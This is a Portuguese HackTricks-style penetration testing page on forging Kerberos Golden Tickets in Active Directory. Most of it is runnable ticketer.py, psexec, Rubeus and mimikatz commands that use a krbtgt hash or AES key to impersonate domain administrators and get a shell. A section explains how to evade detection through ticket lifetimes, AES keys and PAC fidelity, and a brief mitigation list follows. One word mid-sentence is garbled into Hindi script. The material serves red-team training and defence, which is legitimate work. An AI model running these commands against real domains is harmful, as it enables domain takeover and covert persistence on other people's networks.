# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Um ataque de **Golden Ticket** consiste na **criação de um Ticket Granting Ticket (TGT) legítimo, personificando qualquer usuário** por meio do uso do **hash NTLM da conta krbtgt do Active Directory (AD)**. Essa técnica é particularmente vantajosa porque **permite acesso a qualquer serviço ou máquina** dentro do domínio como o usuário personificado. É crucial lembrar que as **credenciais da conta krbtgt nunca são atualizadas automaticamente**.

Para **obter o hash NTLM** da conta krbtgt, vários métodos podem ser empregados. Ele pode ser extraído do processo **Local Security Authority Subsystem Service (LSASS)** ou do arquivo **NT Directory Services (NTDS.dit)** localizado em qualquer Domain Controller (DC) dentro do domínio. Além disso, **executar um ataque DCsync** é outra estratégia para obter esse hash NTLM, o que pode ser feito usando ferramentas como o módulo **lsadump::dcsync** no Mimikatz ou o script **secretsdump.py** do Impacket. É importante enfatizar que, para realizar essas operações, **privilégios de domain admin ou um nível de acesso semelhante normalmente são आवश्यकidos**.

Embora o hash NTLM sirva como um método viável para esse propósito, é **fortemente recomendado** **forjar tickets usando as chaves Kerberos do Advanced Encryption Standard (AES) (AES128 e AES256)** por razões de segurança operacional. Isso é ainda mais importante em domínios modernos porque o **uso de RC4 está sendo descontinuado** e se destaca muito mais claramente na telemetria do Kerberos.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Notas modernas de crafting de tickets

Quando possível, **consulte LDAP e SYSVOL primeiro** e então forge o ticket usando a política real do domínio e os valores PAC do usuário em vez de inventá-los manualmente:
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` pede ao DC os dados do usuário, grupo, NetBIOS e política usados para construir um PAC mais realista.
- `/printcmd` imprime uma linha de comando offline contendo os campos do PAC recuperados, o que é útil se você depois quiser forjar o mesmo ticket sem tocar no LDAP novamente.
- `/extendedupndns` adiciona os novos elementos `UpnDns` do PAC contendo o `samAccountName` e o SID da conta.
- `/oldpac` remove os buffers `Requestor` e `Attributes` mais novos do PAC; isso é principalmente útil para testes de compatibilidade com ambientes mais antigos, não para default tradecraft.

From Linux, versões recentes do Impacket também suportam adicionar as novas estruturas PAC e definir um período de validade realista:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` está em **horas**. O padrão é **10 anos**, o que é ruidoso.
- `-extra-pac` adiciona as novas informações de PAC `UPN_DNS`.
- `-old-pac` força o layout legado do PAC.
- `-extra-sid` é útil quando o PAC precisa de SIDs adicionais (por exemplo, em cenários de escalada child-to-parent, que são cobertos em [SID-History Injection](sid-history-injection.md)).

**Uma vez** que você tenha o **golden Ticket injetado**, você pode acessar os arquivos compartilhados **(C$)**, e executar services e WMI, então você pode usar **psexec** ou **wmiexec** para obter uma shell (parece que você não consegue obter uma shell via winrm).

### Bypassing common detections

As formas mais frequentes de detectar um golden ticket são por **inspecionar o tráfego Kerberos** na rede. Por padrão, o Mimikatz **assina o TGT por 10 anos**, o que vai se destacar como anômalo em subsequentes requests TGS feitas com ele.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Use os parâmetros `/startoffset`, `/endin` e `/renewmax` para controlar o start offset, a duração e o máximo de renewals (todos em minutos).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Infelizmente, o tempo de vida do TGT não é registrado nos 4769, então você não encontrará essa informação nos Windows event logs. No entanto, o que você pode correlacionar é **ver 4769 sem um 4768 anterior**. **Não é possível solicitar um TGS sem um TGT**, e se não houver registro de que um TGT foi emitido, podemos inferir que ele foi forjado offline.

Em **builds mais recentes do Windows**, os Event IDs **4768** e **4769** também expõem uma telemetria de **encryption type** muito melhor. Um TGT/TGS forjado usando **RC4 (`0x17`)** em um domínio onde `krbtgt`, clients e services já têm AES keys é muito mais fácil de detectar do que era há alguns anos. Esse é mais um motivo para preferir **AES-backed Golden Tickets** e para corresponder o mais possível à Kerberos policy normal do domínio.

Outro problema de OPSEC é a **fidelidade do PAC**. Tickets com memberships de grupo impossíveis, pacotes PAC mais novos ausentes ou metadata da conta que não bate com LDAP são mais fáceis de detectar quando os defensores validam o conteúdo do PAC contra os dados do AD. Se você precisa de um TGT que pareça ter sido realmente emitido por um DC, revise:

{{#ref}}
diamond-ticket.md
{{#endref}}

Também há **limites ambientais** para persistência. A conta `krbtgt` mantém um **password history de 2**, então um TGT forjado pode continuar válido após o **primeiro** reset do `krbtgt` se tiver sido assinado com a chave anterior. É por isso que os defensores invalidam Golden Tickets ao **resetar `krbtgt` duas vezes** e esperar pelo menos o máximo ticket lifetime do domínio entre os resets.

Para **burlar essa detecção**, confira os diamond tickets.

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Outros pequenos truques que os defensores podem usar são **alertar em 4769s para users sensíveis**, como a conta padrão de administrador do domínio, e alertar sobre o uso de **RC4 para `krbtgt`** em domínios que normalmente emitem tickets AES.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
